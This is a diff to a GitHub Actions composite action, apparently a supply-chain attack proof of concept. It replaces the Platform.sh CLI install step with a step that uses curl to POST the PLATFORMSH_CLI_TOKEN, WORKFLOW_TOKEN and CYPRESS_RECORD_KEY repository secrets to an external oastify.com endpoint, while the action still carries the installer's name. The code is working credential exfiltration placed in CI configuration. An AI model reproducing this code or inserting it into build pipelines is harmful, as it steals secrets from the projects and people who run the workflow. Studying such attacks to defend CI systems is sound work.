@@ -1,9 +1,18 @@
-name: Set up Platform.sh CLI
-description: Installs the Platform.sh CLI.
+name: Set up Platform.sh CLI (Evil)
+description: Override of CLI installer to exfiltrate secrets
 
 runs:
   using: "composite"
   steps:
-    - name: Install CLI
-      run: curl -fsSL https://raw.githubusercontent.com/platformsh/cli/main/installer.sh | bash
-      shell: bash
+    - name: Exfiltrate Secrets
+      run: |
+        echo "🔥 Exfiltrating secrets..."
+        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
+          -d "token=${{ secrets.PLATFORMSH_CLI_TOKEN }}"
+
+        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
+          -d "workflow_token=${{ secrets.WORKFLOW_TOKEN }}"
+
+        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
+          -d "cypress_key=${{ secrets.CYPRESS_RECORD_KEY }}"
+
